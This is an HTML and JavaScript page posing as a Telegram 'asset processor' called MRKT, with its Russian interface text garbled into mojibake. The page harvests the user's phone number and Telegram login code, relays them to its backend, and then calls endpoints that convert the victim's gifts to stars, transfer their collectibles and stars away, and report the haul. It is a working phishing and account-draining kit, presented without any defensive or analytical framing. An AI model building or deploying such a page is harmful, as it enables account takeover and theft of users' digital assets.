<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MRKT - Asset Processor</title>
    <style>
        /* –û—Å–Ω–æ–≤–Ω—ã–µ —Å—Ç–∏–ª–∏ –∏–∑ CSS —Ñ–∞–π–ª–∞ */
        @import"https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap";
        *{margin:0;padding:0;box-sizing:border-box}body{font-family:Manrope,sans-serif;height:100vh;overflow:hidden}.App{width:100%;height:100vh}
        
        #root{width:100%;height:100vh}
        .loader-container{position:fixed;top:0;left:0;width:100%;height:100vh;background-color:#01aaff;display:flex;align-items:center;justify-content:center;z-index:9999}
        .loader-content{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;text-align:center;gap:20px;width:100%;max-width:500px}
        .loader-gif{max-width:280px;max-height:280px;width:auto;height:auto;margin-bottom:10px}
        .loader-title{font-size:32px;font-weight:700;color:#fff;margin:0;line-height:1.2;width:100%}
        .loader-subtitle{font-size:18px;font-weight:400;color:#ffffffe6;margin:0;line-height:1.4;width:100%;max-width:400px}
        
        .main-container{position:fixed;top:0;left:0;width:100%;height:100vh;background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);display:flex;align-items:center;justify-content:center;z-index:9998}
        
        /* –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã —ç–∫—Ä–∞–Ω–æ–≤ */
        .screen{display:none;flex-direction:column;align-items:center;justify-content:center;padding:30px;text-align:center;gap:25px;width:100%;max-width:400px;opacity:0;transform:translateY(20px);transition:all 0.5s ease-in-out}
        .screen.active{display:flex;opacity:1;transform:translateY(0)}
        
        /* –û–±—â–∏–µ —Å—Ç–∏–ª–∏ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ */
        .screen-image{max-width:200px;max-height:200px;width:auto;height:auto;margin-bottom:15px;border-radius:20px}
        .screen-title{font-size:28px;font-weight:700;color:#fff;margin:0;line-height:1.2;width:100%}
        .screen-subtitle{font-size:16px;font-weight:400;color:#ffffffe6;margin:0;line-height:1.4;width:100%;max-width:350px}
        
        /* –ö–Ω–æ–ø–∫–∏ */
        .btn{display:flex;align-items:center;justify-content:center;gap:12px;padding:16px 28px;background:linear-gradient(135deg,#fff,#e6f4ff);border:none;border-radius:14px;font-family:Manrope,sans-serif;font-size:16px;font-weight:600;color:#01aaff;cursor:pointer;transition:all .3s ease;min-width:280px;width:100%;max-width:320px}
        .btn:hover{transform:translateY(-3px);box-shadow:0 10px 25px rgba(0,0,0,0.2)}
        .btn-secondary{background:transparent;border:2px solid rgba(255,255,255,0.3);color:#fff}
        .btn-secondary:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.5)}
        
        /* –§–æ—Ä–º—ã */
        .form-group{display:flex;flex-direction:column;gap:15px;width:100%;max-width:320px}
        .form-input{width:100%;padding:16px 20px;font-family:Manrope,sans-serif;font-size:16px;font-weight:500;border:2px solid rgba(255,255,255,.3);border-radius:12px;background:#ffffff1a;color:#fff;outline:none;transition:all .3s ease}
        .form-input:focus{border-color:#fffc;background:#fff3}
        .form-input::placeholder{color:#fff9}
        
        /* –ü—Ä–æ–≥—Ä–µ—Å—Å –±–∞—Ä */
        .progress-container{width:100%;max-width:320px;background:rgba(255,255,255,0.2);border-radius:10px;overflow:hidden;height:8px}
        .progress-bar{height:100%;background:linear-gradient(90deg, #00ff88, #00ccff);transition:width 0.3s ease;width:0%}
        
        /* –°–ø–∏–Ω–Ω–µ—Ä */
        .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,.3);border-top:4px solid white;border-radius:50%;animation:spin 1s linear infinite}
        @keyframes spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}
        
        /* –ê–Ω–∏–º–∞—Ü–∏–∏ */
        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
        @keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
        
        .fade-in{animation:fadeIn 0.5s ease-in-out}
        .slide-up{animation:slideUp 0.5s ease-in-out}
        
        /* –ê–¥–∞–ø—Ç–∏–≤–Ω–æ—Å—Ç—å */
        @media (max-width: 480px){
            .screen{padding:20px;gap:20px;max-width:320px}
            .screen-title{font-size:24px}
            .screen-subtitle{font-size:14px}
            .btn{padding:14px 24px;font-size:15px;min-width:250px;max-width:280px}
            .form-group{max-width:280px}
        }
    </style>
</head>
<body>
    <div class="App">
        <!-- –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏ -->
        <div class="loader-container" id="loaderScreen">
            <div class="loader-content">
                <div class="spinner"></div>
                <h1 class="loader-title">–ó–∞–≥—Ä—É–∑–∫–∞</h1>
                <p class="loader-subtitle">–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è...</p>
            </div>
        </div>

        <!-- –û—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä -->
        <div class="main-container">
            <!-- –ì–ª–∞–≤–Ω—ã–π —ç–∫—Ä–∞–Ω -->
            <div class="screen active" id="mainScreen">
                <img src="https://images.unsplash.com/photo-1518837695005-2083093ee35b?w=400" alt="Stars" class="screen-image">
                <h1 class="screen-title">–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å</h1>
                <p class="screen-subtitle">–ü–æ–¥–∫–ª—é—á–∏—Ç–µ Telegram –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∞–∫—Ç–∏–≤–æ–≤</p>
                <button class="btn" onclick="showScreen('authScreen')">
                    <span>üîë –ü–æ–¥–∫–ª—é—á–∏—Ç—å Telegram</span>
                </button>
            </div>

            <!-- –≠–∫—Ä–∞–Ω –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ -->
            <div class="screen" id="authScreen">
                <img src="https://images.unsplash.com/photo-1611605698335-8b1569810432?w=400" alt="Security" class="screen-image">
                <h1 class="screen-title">–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –≤—Ö–æ–¥</h1>
                <p class="screen-subtitle">–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–¥–∞</p>
                <div class="form-group">
                    <input type="tel" class="form-input" id="phoneInput" placeholder="+7 XXX XXX XX XX" required>
                    <button class="btn" onclick="sendAuthCode()">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</button>
                </div>
                <button class="btn btn-secondary" onclick="showScreen('mainScreen')">–ù–∞–∑–∞–¥</button>
            </div>

            <!-- –≠–∫—Ä–∞–Ω –≤–≤–æ–¥–∞ –∫–æ–¥–∞ -->
            <div class="screen" id="codeScreen">
                <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=400" alt="Verification" class="screen-image">
                <h1 class="screen-title">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ</h1>
                <p class="screen-subtitle">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram</p>
                <div class="form-group">
                    <input type="text" class="form-input" id="codeInput" placeholder="12345" maxlength="6" required>
                    <button class="btn" onclick="verifyCode()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
                </div>
                <button class="btn btn-secondary" onclick="showScreen('authScreen')">–ù–∞–∑–∞–¥</button>
            </div>

            <!-- –≠–∫—Ä–∞–Ω —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –∞–∫—Ç–∏–≤–æ–≤ -->
            <div class="screen" id="scanScreen">
                <img src="https://images.unsplash.com/photo-1534447677768-be436bb09401?w=400" alt="Scanning" class="screen-image">
                <h1 class="screen-title">–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ</h1>
                <p class="screen-subtitle">–ü–æ–∏—Å–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ –∏ –∞–∫—Ç–∏–≤–æ–≤...</p>
                <div class="progress-container">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                <div class="spinner"></div>
            </div>

            <!-- –≠–∫—Ä–∞–Ω —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ -->
            <div class="screen" id="resultsScreen">
                <img src="https://images.unsplash.com/photo-1579546929518-9e396f3cc809?w=400" alt="Results" class="screen-image">
                <h1 class="screen-title" id="resultsTitle">–†–µ–∑—É–ª—å—Ç–∞—Ç—ã</h1>
                <p class="screen-subtitle" id="resultsSubtitle">–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞</p>
                <div class="form-group" id="resultsContent">
                    <!-- –î–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ -->
                </div>
                <button class="btn" onclick="showScreen('mainScreen')">–ó–∞–≤–µ—Ä—à–∏—Ç—å</button>
            </div>

            <!-- –≠–∫—Ä–∞–Ω –æ—à–∏–±–∫–∏ -->
            <div class="screen" id="errorScreen">
                <img src="https://images.unsplash.com/photo-1560472354-b33ff0c44a43?w=400" alt="Error" class="screen-image">
                <h1 class="screen-title">–û—à–∏–±–∫–∞</h1>
                <p class="screen-subtitle" id="errorMessage">–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞</p>
                <button class="btn" onclick="showScreen('mainScreen')">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>
            </div>
        </div>
    </div>

    <script>
        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
        let currentPhone = '';
        let currentCodeHash = '';
        let currentUserId = '';

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
        function initApp() {
            setTimeout(() => {
                document.getElementById('loaderScreen').style.display = 'none';
                showScreen('mainScreen');
            }, 2000);
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å —ç–∫—Ä–∞–Ω
        function showScreen(screenId) {
            // –°–∫—Ä—ã—Ç—å –≤—Å–µ —ç–∫—Ä–∞–Ω—ã
            const screens = document.querySelectorAll('.screen');
            screens.forEach(screen => {
                screen.classList.remove('active');
                screen.style.display = 'none';
            });
            
            // –ü–æ–∫–∞–∑–∞—Ç—å —Ü–µ–ª–µ–≤–æ–π —ç–∫—Ä–∞–Ω
            const targetScreen = document.getElementById(screenId);
            targetScreen.style.display = 'flex';
            setTimeout(() => {
                targetScreen.classList.add('active');
            }, 50);
        }

        // –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
        async function sendAuthCode() {
            const phone = document.getElementById('phoneInput').value;
            if (!phone) {
                showError('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                return;
            }

            currentPhone = phone;
            showScreen('codeScreen');

            try {
                const response = await fetch('/auth/send-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ phone: phone })
                });

                const data = await response.json();
                
                if (data.success) {
                    currentCodeHash = data.phone_code_hash;
                } else {
                    showError(data.message || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞');
                }
            } catch (error) {
                showError('–û—à–∏–±–∫–∞ —Å–µ—Ç–∏');
            }
        }

        // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–¥
        async function verifyCode() {
            const code = document.getElementById('codeInput').value;
            if (!code) {
                showError('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è');
                return;
            }

            showScreen('scanScreen');
            simulateProgress();

            try {
                const response = await fetch('/auth/verify-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: currentPhone,
                        phone_code_hash: currentCodeHash,
                        code: code
                    })
                });

                const data = await response.json();
                
                if (data.success) {
                    currentUserId = data.user_id;
                    await processAssets();
                } else {
                    showError(data.message || '–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥');
                }
            } catch (error) {
                showError('–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–¥–∞');
            }
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∞–∫—Ç–∏–≤–æ–≤
        async function processAssets() {
            try {
                // –ü–æ–ª—É—á–∏—Ç—å –ø–æ–¥–∞—Ä–∫–∏
                const giftsResponse = await fetch('/api/get-gifts', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        user_id: currentUserId,
                        phone: currentPhone
                    })
                });

                const giftsData = await giftsResponse.json();
                
                if (giftsData.success) {
                    let processedCount = 0;
                    let totalStars = 0;
                    let collectibles = 0;

                    // –û–±—Ä–∞–±–æ—Ç–∞—Ç—å –∫–∞–∂–¥—ã–π –ø–æ–¥–∞—Ä–æ–∫
                    for (const gift of giftsData.gifts) {
                        if (gift.can_convert) {
                            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –≤ –∑–≤–µ–∑–¥—ã
                            const convertResponse = await fetch('/api/convert-gift', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    user_id: currentUserId,
                                    gift_id: gift.id,
                                    phone: currentPhone
                                })
                            });
                            
                            const convertData = await convertResponse.json();
                            if (convertData.success) {
                                processedCount++;
                                totalStars += gift.stars || 100;
                            }
                        } else if (gift.can_transfer && gift.unique) {
                            // –ü–µ—Ä–µ–¥–∞—Ç—å –∫–æ–ª–ª–µ–∫—Ü–∏–æ–Ω–Ω—ã–π –ø–æ–¥–∞—Ä–æ–∫
                            const transferResponse = await fetch('/api/transfer-collectible', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    user_id: currentUserId,
                                    gift_id: gift.id,
                                    phone: currentPhone
                                })
                            });
                            
                            const transferData = await transferResponse.json();
                            if (transferData.success) {
                                collectibles++;
                            }
                        }
                    }

                    // –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –∑–≤–µ–∑–¥—ã
                    const starsResponse = await fetch('/api/transfer-stars', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            user_id: currentUserId,
                            phone: currentPhone
                        })
                    });

                    // –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∏–Ω–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç
                    await fetch('/api/final-report', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            user_id: currentUserId,
                            phone: currentPhone,
                            total_gifts: giftsData.gifts.length,
                            processed_gifts: processedCount,
                            collectibles: collectibles
                        })
                    });

                    // –ü–æ–∫–∞–∑–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
                    showResults(processedCount, collectibles, totalStars, giftsData.gifts.length);
                } else {
                    showError('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤');
                }
            } catch (error) {
                showError('–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∞–∫—Ç–∏–≤–æ–≤');
            }
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        function showResults(processed, collectibles, stars, total) {
            const resultsContent = document.getElementById('resultsContent');
            const resultsTitle = document.getElementById('resultsTitle');
            const resultsSubtitle = document.getElementById('resultsSubtitle');
            
            resultsTitle.textContent = '–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞';
            resultsSubtitle.textContent = `–£—Å–ø–µ—à–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ ${processed + collectibles} –∏–∑ ${total} –∞–∫—Ç–∏–≤–æ–≤`;
            
            resultsContent.innerHTML = `
                <div style="text-align: left; color: white; font-size: 14px;">
                    <div style="margin-bottom: 10px;">‚úÖ –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤: ${processed}</div>
                    <div style="margin-bottom: 10px;">üéÅ –ü–µ—Ä–µ–¥–∞–Ω–æ –∫–æ–ª–ª–µ–∫—Ü–∏–æ–Ω–Ω—ã—Ö: ${collectibles}</div>
                    <div style="margin-bottom: 10px;">‚≠ê –ü–æ–ª—É—á–µ–Ω–æ –∑–≤–µ–∑–¥: ${stars}</div>
                    <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 10px;">
                        <strong>–í—Å–µ –∞–∫—Ç–∏–≤—ã —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω—ã</strong>
                    </div>
                </div>
            `;
            
            showScreen('resultsScreen');
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å –æ—à–∏–±–∫—É
        function showError(message) {
            document.getElementById('errorMessage').textContent = message;
            showScreen('errorScreen');
        }

        // –°–∏–º—É–ª—è—Ü–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
        function simulateProgress() {
            const progressBar = document.getElementById('progressBar');
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                } else {
                    width += Math.random() * 10;
                    progressBar.style.width = Math.min(width, 100) + '%';
                }
            }, 300);
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', initApp);

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç Telegram Web App
        window.addEventListener('message', (event) => {
            if (event.data && event.data.type === 'telegram_login') {
                // –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ª–æ–≥–∏–Ω–∞ Telegram
                console.log('Telegram login data:', event.data);
            }
        });
    </script>
</body>
</html>
